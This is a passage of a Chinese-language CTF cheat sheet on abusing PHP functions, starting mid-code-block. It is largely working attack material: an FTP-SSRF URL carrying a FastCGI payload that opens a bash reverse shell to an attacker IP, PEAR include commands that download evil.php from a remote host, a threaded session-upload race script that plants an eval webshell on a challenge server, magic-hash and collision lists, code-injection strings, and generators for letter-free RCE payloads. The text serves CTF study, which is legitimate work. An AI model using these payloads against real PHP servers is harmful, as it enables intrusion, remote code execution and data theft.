class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) </span><br><span class="line">s.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">123</span>))</span><br><span class="line">s.listen(<span class="number">1</span>)</span><br><span class="line">conn, addr = s.accept()</span><br><span class="line">conn.send(<span class="string">b&#x27;220 welcome\n&#x27;</span>)</span><br><span class="line">conn.send(<span class="string">b&#x27;331 Please specify the password.\n&#x27;</span>)</span><br><span class="line">conn.send(<span class="string">b&#x27;230 Login successful.\n&#x27;</span>)</span><br><span class="line">conn.send(<span class="string">b&#x27;200 Switching to Binary mode.\n&#x27;</span>)</span><br><span class="line">conn.send(<span class="string">b&#x27;550 Could not get the file size.\n&#x27;</span>)</span><br><span class="line">conn.send(<span class="string">b&#x27;150 ok\n&#x27;</span>)</span><br><span class="line">conn.send(<span class="string">b&#x27;227 Entering Extended Passive Mode (127,0,0,1,0,9001)\n&#x27;</span>) <span class="comment">#STOR / (2)</span></span><br><span class="line">conn.send(<span class="string">b&#x27;150 Permission denied.\n&#x27;</span>)</span><br><span class="line">conn.send(<span class="string">b&#x27;221 Goodbye.\n&#x27;</span>)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure><p>启动服务器之后再监听反弹的端口：</p><p><code>http://ip:8080/ftp.php?file=ftp://@ip:123/&amp;data=%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%0F%07%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH107%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F!SCRIPT_FILENAME/usr/share/nginx/html/phpinfo.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00k%04%00%3C%3Fphp%20system(%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/ip/1234%200%3E%261%22%27)%3Bdie(%27-----Made-by-SpyD3r-----%0A%27)%3B%3F%3E%00%00%00%00</code></p><p>参考：<a target="_blank" rel="noopener" href="https://whoamianony.top/2021/10/24/Web%E5%AE%89%E5%85%A8/%E6%95%99%E4%BD%A0%E7%94%A8%20FTP%20SSRF%20%E6%89%93%E7%A9%BF%E5%86%85%E7%BD%91/">教你用 FTP SSRF 打穿内网</a></p></li></ol><h3 id="sha1-比较"><a href="#sha1-比较" class="headerlink" title="sha1()比较"></a>sha1()比较</h3><ol><li><p>以数组为参数</p><p>sha1()函数无法处理数组类型，将报错并返回false。</p></li><li><p>特殊情况汇总</p><blockquote><p>10932435112: 0e07766915004133176347055865026311692244<br>aaroZmOk: 0e66507019969427134894567494305185566735<br>aaK1STfY: 0e76658526655756207688271159624026011393<br>aaO8zKZF: 0e89257456677279068558073954252716165668<br>aa3OFF9m: 0e36977786278517984959260394024281014729</p><p>0e1290633704: 0e19985187802402577070739524195726831799</p></blockquote></li></ol><h3 id="md5-比较"><a href="#md5-比较" class="headerlink" title="md5()比较"></a>md5()比较</h3><ol><li><p>比较缺陷利用（限==弱类型情况）</p><blockquote><p>QNKCDZO - 0e830400451993494058024219903391</p><p>PJNPDWY: 0e291529052894702774557631701704<br>NWWKITQ: 0e763082070976038347657360817689<br>NOOPCJF: 0e818888003657176127862245791911<br>MMHUWUV: 0e701732711630150438129209816536<br>MAUXXQC: 0e478478466848439040434801845361<br>IHKFRNS: 0e256160682445802696926137988570<br>GZECLQZ: 0e537612333747236407713628225676<br>GGHMVOE: 0e362766013028313274586933780773<br>GEGHBXL: 0e248776895502908863709684713578<br>EEIZDOI: 0e782601363539291779881938479162<br>DYAXWCA: 0e424759758842488633464374063001<br>DQWRASX: 0e742373665639232907775599582643<br>BRTKUJZ: 00e57640477961333848717747276704<br>ABJIHVY: 0e755264355178451322893275696586</p><p>240610708 - 0e462097431906509019562988736854<br>s878926199a - 0e545993274517709034328855841020<br>s155964671a - 0e342768416822451524974117254469<br>s214587387a - 0e848240448830537924465865611904<br>s878926199a - 0e545993274517709034328855841020<br>s1091221200a - 0e940624217856561557816327384675</p><p>aaaXXAYW: 0e540853622400160407992788832284<br>aabg7XSs: 0e087386482136013740957780965295<br>aabC9RqS: 0e041022518165728065344349536299</p><p>0e215962017 - 0e291242476940776845150308577824</p></blockquote></li><li><p>比较缺陷利用（限===强类型情况）</p><p>工具：fastcoll</p><p>两组经过url编码后的值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</span><br><span class="line"></span><br><span class="line">b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span><br></pre></td></tr></table></figure></li><li><p>以数组为参数</p><p>md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL，也就是相等的。</p></li><li><p>NaN 和 INF</p><p><code>NAN</code>和<code>INF</code>，分别为非数字和无穷大，但是var_dump一下它们的数据类型却是double，那么在md5函数处理它们的时候，是将其直接转换为字符串”NAN”和字符串”INF”使用的，但是它们拥有特殊的性质，它们与任何数据类型（除了true）做强类型或弱类型比较均为false，甚至<code>NAN===NAN</code>都是false，但<code>md5(&#39;NaN&#39;)===md5(&#39;NaN&#39;)</code>为true。</p></li><li><p>md5(string,raw)</p><blockquote><p><strong>md5(string,raw)</strong></p><p><u>string</u> 必需。规定要计算的字符串。<br><u>raw</u> 可选。规定十六进制或二进制输出格式：TRUE - 原始 16 字符二进制格式；FALSE - 默认，32 字符十六进制数。</p></blockquote><p><code>ffifdyop</code>，经过md5函数后结果为 <code>&#39;or&#39;6\xc9]\x99\xe9!r,\xf9\xedb\x1c</code>；</p><p><code>129581926211651571912466741651878684928</code>，经过md5函数后结果为 <code>\x06\xdaT0D\x9f\x8fo#\xdf\xc1&#39;or&#39;8</code>；</p></li></ol><h3 id="create-function"><a href="#create-function" class="headerlink" title="create_function()"></a>create_function()</h3><ol><li><p>代码注入</p><p>源码 <code>$func(&#39;&#39;,$arg)</code> ：</p><p><code>$func=&#39;create_function&#39;;</code></p><p><code>$arg=&#39;2;&#125;phpinfo();//&#39;</code> 或 <code>$arg=&#39;2;&#125;require(base64_decode(xxx));var_dump(get_defined_vars());//</code></p></li></ol><h3 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h3><ol><li><p>调用类静态方法</p><p><code>call_user_func(&#39;Func::_One&#39;,&#39;one&#39;)</code></p><p><code>call_user_func([&#39;Func&#39;,&#39;_One&#39;])</code></p><p>参考：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1411010">https://cloud.tencent.com/developer/article/1411010</a></p></li></ol><h3 id="escapeshellarg"><a href="#escapeshellarg" class="headerlink" title="escapeshellarg()"></a>escapeshellarg()</h3><ol><li>不可见字符插入（%80-%ff）</li></ol><h3 id="ereg-eregi"><a href="#ereg-eregi" class="headerlink" title="ereg() / eregi()"></a>ereg() / eregi()</h3><ol><li><p>NULL截断漏洞</p><p>ereg()函数存在NULL截断漏洞,可以%00截断，遇到%00则默认为字符串的结束，所以可以绕过一些正则表达式的检查。</p><p>ereg()只能处理字符串的，遇到数组做参数返回NULL。</p></li></ol><h3 id="strpos"><a href="#strpos" class="headerlink" title="strpos()"></a>strpos()</h3><ol><li><p>以数组为参数</p><p>strpos()函数如果传入数组，便会返回NULL。</p></li><li><p>二次编码绕关键字</p><p>参考：<a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=76671">https://bugs.php.net/bug.php?id=76671</a></p></li></ol><h3 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp()"></a>strcmp()</h3><ol><li><p>函数缺陷</p><blockquote><p><code>strcmp()</code>函数比较两个字符串(区分大小写），定义中是比较<strong>字符串类型</strong>的，但如果输入其他类型这个函数将发生错误，在官方文档的说明中说到在<code>php 5.2</code>版本之前，利用<code>strcmp</code>函数将数组与字符串进行比较会返回<code>-1</code>，但是从<code>5.3</code>开始，会返回<code>0</code>。</p></blockquote></li></ol><h3 id="add-slashes"><a href="#add-slashes" class="headerlink" title="add_slashes()"></a>add_slashes()</h3><ol><li><code>$&#123;phpinfo()&#125;</code></li></ol><h3 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h3><ol><li><p>代码执行（限/e模式）</p><blockquote><p><code>preg_replace</code>(PHP 5.5)<br>功能 ： 函数执行一个正则表达式的搜索和替换<br>定义 ： <code>mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject )</code><br>搜索 subject 中匹配 pattern 的部分， 如果匹配成功以 replacement 进行替换<br><code>$pattern</code> 存在 /e 模式修正符，允许代码执行<br>/e 模式修正符，是 preg_replace() 将 <code>$replacement</code> 当做php代码来执行</p></blockquote></li></ol><h3 id="filter-var"><a href="#filter-var" class="headerlink" title="filter_var()"></a>filter_var()</h3><ul><li><p><strong>FILTER_VALIDATE_EMAIL</strong></p><p>形式：<code>local-part@domain-part</code></p><ol><li>邮箱local-part部分可以用双引号包裹，双引号内即可填入任意字符，如<code>&quot;Joe&#39;Blow&quot;@example.com</code></li></ol></li><li><p><strong>FILTER_VALIDATE_URL</strong></p><ol><li><code>0://www.baidu.com;</code></li></ol></li></ul><h3 id="is-file-file-exists"><a href="#is-file-file-exists" class="headerlink" title="is_file() / file_exists()"></a>is_file() / file_exists()</h3><ol><li><p>超过20次软链接后可以绕过：</p><p><code>?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</code></p></li></ol><h3 id="include-（文件包含）"><a href="#include-（文件包含）" class="headerlink" title="include() （文件包含）"></a>include() （文件包含）</h3><ol><li><p>日志包含</p><p>URL：<code>?x=/var/log/nginx/access.log</code></p><p>修改<code>User-Agent</code>为<code>&lt;?php highlight_file(&#39;xxx.php&#39;); ?&gt;</code></p></li><li><p>有后缀绕过</p><p><code>?c=data:text/plain,&lt;?php system(&#39;ls&#39;)?&gt;</code></p><p><code>?c=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4</code></p><p><code>?c=data:,&lt;?php system(&#39;ls&#39;)?&gt;</code></p></li><li><p>zip/phar协议包含（有特定后缀）</p><p>这个方法适用于验证包含文件为特定后缀时。</p><ul><li><p><strong>zip</strong></p><p>首先新建一个zip文件，里面压缩着一个php脚本。</p><p>然后构造<code>zip://php.zip#php.jpg</code>：</p><p><code>http://127.0.0.1/file.php?file=zip://php.zip%23php.jpg</code></p></li><li><p><strong>phar</strong> (PHP版本&gt;5.3.0)</p><p>首先要用phar类打包一个phar标准包：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">new</span> PharData(dirname(<span class="keyword">__FILE__</span>).<span class="string">&#x27;/phartest2.zip&#x27;</span>, <span class="number">0</span>,<span class="string">&#x27;phartest2&#x27;</span>,Phar::ZIP); </span><br><span class="line"><span class="variable">$x</span>=file_get_contents(<span class="string">&#x27;./php.php&#x27;</span>);</span><br><span class="line"><span class="variable">$p</span>-&gt;addFromString(<span class="string">&#x27;a.jpg&#x27;</span>, <span class="variable">$x</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>会生成一个zip的压缩文件。然后构造</p><p><code>http://127.0.0.1/file.php?file=phar://php.zip/php.jpg</code></p></li></ul></li><li><p>利用<strong>session.upload_progress</strong></p><p>可以利用<code>session.upload_progress</code>将恶意语句写入session文件，从而包含session文件。前提需要知道session文件的存放位置。</p><p>如果<code>session.auto_start=On</code> ，则PHP在接收请求的时候会自动初始化Session，不再需要执行session_start()。但默认情况下，这个选项都是关闭的。</p><p>session有一个默认选项，<code>session.use_strict_mode</code>默认值为<code>0</code>。此时用户是可以自己定义Session ID的。比如，我们在Cookie里设置<code>PHPSESSID=TGAO</code>，PHP将会在服务器上创建一个文件：<code>/tmp/sess_TGAO</code>。即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值由<code>ini.get(&quot;session.upload_progress.prefix&quot;)+由我们构造的session.upload_progress.name值</code>组成，最后被写入sess_文件里。</p><p>默认配置<code>session.upload_progress.cleanup = on</code>导致文件上传后，session文件内容立即清空，此时我们可以利用竞争，在session文件内容清空前进行包含利用。</p><p>参考：<a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/202819.html">https://www.freebuf.com/vuls/202819.html</a></p><p><strong>常见PHP-Session存放位置</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/var/lib/php5/sess_PHPSESSID</span><br><span class="line">/var/lib/php7/sess_PHPSESSID</span><br><span class="line">/var/lib/php/sess_PHPSESSID</span><br><span class="line">/tmp/sess_PHPSESSID</span><br><span class="line">/tmp/sessions/sess_PHPSESSED</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">sessid = <span class="string">&#x27;Q&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&quot;cmd&quot;</span>:<span class="string">&quot;system(&#x27;cat fl0g.php&#x27;);&quot;</span>&#125;</span><br><span class="line">url = <span class="string">&#x27;http://6bad481c-1da6-4a89-92f6-db28a56e4f28.chall.ctf.show/index.php&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">		resp = session.post(url, data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;, files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;q.txt&#x27;</span>,f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125; )</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		resp = session.post(url+<span class="string">&#x27;?file=/tmp/sess_&#x27;</span>+sessid,data=data)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">&#x27;q.txt&#x27;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">			<span class="built_in">print</span>(resp.text)</span><br><span class="line">			event.clear()</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="comment">#print(&quot;[+++++++++++++]retry&quot;)</span></span><br><span class="line">			<span class="keyword">pass</span></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	event=threading.Event()</span><br><span class="line">	<span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>): </span><br><span class="line">			threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">			threading.Thread(target=read,args=(session,)).start()</span><br><span class="line">	event.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure></li></ol><ol><li><p>利用<strong>PEAR</strong> （开启register_argc_argv）</p><p>PEAR是可重用的PHP组件框架和系统分发，会随PHP安装时自动安装。</p><p><code>?file=pearcmd&amp;+download+http://vps/eval.php</code></p><p><code>?file=/usr/local/lib/php/pearcmd.php&amp;+-c+/tmp/eval.php+-d+man_dir=&lt;?eval($_POST[0]);?&gt;+-s+ HTTP/1.1</code>（Burpsuite防浏览器转码）</p><p><code>?file=pearcmd.php&amp;+install+-R+/tmp+http://ip/evil.php</code> （路径：<code>/tmp/tmp/pear/download/evil.php</code>）</p><p>​</p></li></ol><h3 id="die-exit"><a href="#die-exit" class="headerlink" title="die() / exit()"></a>die() / exit()</h3><p>参考：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/202510">https://www.anquanke.com/post/id/202510</a></p><ul><li><p>过滤关键词</p><p>urlencode</p></li><li><p>过滤<code>%25</code></p><p>二次编码：<code>a:%6%31 b:%6%32 i:%6%39 q:%7%31 r:%7%32 u:%7%35 U:%5%35</code></p></li><li><p>allow_url_include=Off</p><blockquote><p>file_get_contents 允许使用 data URI，会直接返回后面的内容，很奇怪的是，在 allow_url_include=Off 的情况下，不允许 require_once data URI 的，但是如果 <code>data:,XXX</code> 是一个目录名的话，就会放开限制。</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ php -a</span><br><span class="line">Interactive mode enabled</span><br><span class="line"></span><br><span class="line">php &gt; <span class="built_in">echo</span> file_get_contents(<span class="string">&#x27;data:,123456/ricky&#x27;</span>);</span><br><span class="line">123456/ricky</span><br><span class="line">php &gt; <span class="built_in">echo</span> require_once(<span class="string">&#x27;data:,123456/ricky&#x27;</span>);</span><br><span class="line">flag&#123;xxxxxxxxxx&#125;</span><br><span class="line">php &gt;</span><br></pre></td></tr></table></figure></li></ul><h3 id="open"><a href="#open" class="headerlink" title="open()"></a>open()</h3><p>PHP原生类：<code>ZipArchive::open($filename,$flags)</code></p><p>调用可删除文件：<code>ZipArchive::open(&#39;xxx&#39;,ZipArchive::OVERWRITE)</code>=<code>ZipArchive::open(&#39;xxx&#39;,8)</code></p><p>​</p><h3 id="parse-url"><a href="#parse-url" class="headerlink" title="parse_url()"></a>parse_url()</h3><p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/tr1ple/p/11137159.html">https://www.cnblogs.com/tr1ple/p/11137159.html</a></p><ol><li><p>//绕过</p><p>把//认为是相对路径（PHP&lt;5.4.7）。</p><p>如果是//，则被解析成host，后面的内容如果有/，被解析出path，而不是query了。</p></li><li><p>///绕过</p><p>三个斜杠导致严重不合格的URL，parse_url() 返回FALSE。</p></li></ol><h3 id="basename"><a href="#basename" class="headerlink" title="basename()"></a>basename()</h3><p>返回路径中的文件名部分，会去掉文件名开头的非ASCII值。</p><p><code>var_dump(basename(&quot;\xffconfig.php&quot;)); =&gt; config.php</code></p><p><code>var_dump(basename(&quot;config.php\xff&quot;)); =&gt; config.php</code></p><p>​</p><h3 id="参数特性"><a href="#参数特性" class="headerlink" title="参数特性"></a>参数特性</h3><ol><li><p>参数中的<code>+</code>、<code>[</code>、空格、<code>.</code>均会变为<code>_</code></p></li><li><p>参数形式<code>A_B.C</code>：使用<code>A[B.C</code>传入</p><p>​</p></li></ol><h3 id="无字母-数字-特定符号RCE"><a href="#无字母-数字-特定符号RCE" class="headerlink" title="无字母/数字/特定符号RCE"></a>无字母/数字/特定符号RCE</h3><ol><li><p>取反（<code>~</code>）</p><p><code>phpinfo()</code> → <code>(~%8F%97%8F%96%91%99%90)()</code></p><p><code>system(&#39;ls&#39;)</code> → <code>(~%8C%86%8C%8B%9A%92)(~%93%8C)</code></p></li><li><p>异或（<code>^</code>）</p><p><code>phpinfo()</code> → <code>$_GET[x]&amp;x=phpinfo</code> → <code>${%A0%A0%A0%A0^%FF%E7%E5%F4}{x}()&x=phpinfo</code></p><p><code>system(&#39;ls&#39;)</code> → <code>$_GET[x]($_GET[y])&amp;x=system&amp;y=ls</code> → <code>${%A0%A0%A0%A0^%FF%E7%E5%F4}{x}(${%A0%A0%A0%A0^%FF%E7%E5%F4}{y})&x=system&y=ls</code> `</p><p>无字母情形：</p><p><code>phpinfo()</code> → <code>(&#39;484880800&#39;^&#39;8.8-**)00&#39;^&#39;|~||||~()&#39;)</code></p><p><code>system(&#39;ls&#39;)</code> → <code>(&#39;404008008400&#39;^&#39;9598))08*980&#39;^&#39;~|~|||(*~~*)&#39;)</code></p></li><li><p>或（<code>|</code>）</p><p>可以直接将需要构造的字符串与反引号进行<strong>异或</strong>，得到的结果再与反引号相<strong>或</strong>即可得到原字符串。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;````````&quot;</span>^<span class="string">&quot;readfile&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;````&quot;</span>^<span class="string">&quot;flag&quot;</span>;</span><br></pre></td></tr></table></figure><p>payload例：（<code>readfile(&quot;/flag&quot;)</code>）</p><p><code>$code = &quot;(&#39;````````&#39;|&#39; &#39;)(&#39;/````&#39;|&#39;/ &#39;));//&quot;;</code></p><p>参考：</p><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/108569080">https://blog.csdn.net/miuzzx/article/details/108569080</a></p><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/109143413">https://blog.csdn.net/miuzzx/article/details/109143413</a></p><p>构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* author yu22x */</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$myfile</span> = fopen(<span class="string">&quot;or_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">	<span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.dechex(<span class="variable">$i</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=dechex(<span class="variable">$i</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.dechex(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=dechex(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$preg</span> = <span class="string">&#x27;/[0-9a-z]/i&#x27;</span>;<span class="comment">//根据题目给的正则表达式修改即可</span></span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="variable">$preg</span> , hex2bin(<span class="variable">$hex_i</span>))||preg_match(<span class="variable">$preg</span> , hex2bin(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line">		<span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">		<span class="variable">$c</span>=(urldecode(<span class="variable">$a</span>)|urldecode(<span class="variable">$b</span>));</span><br><span class="line">		<span class="keyword">if</span> (ord(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;ord(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">			<span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">fwrite(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line">fclose(<span class="variable">$myfile</span>);</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># author yu22x</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">action</span>(<span class="params">arg</span>):</span></span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;or_rce.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               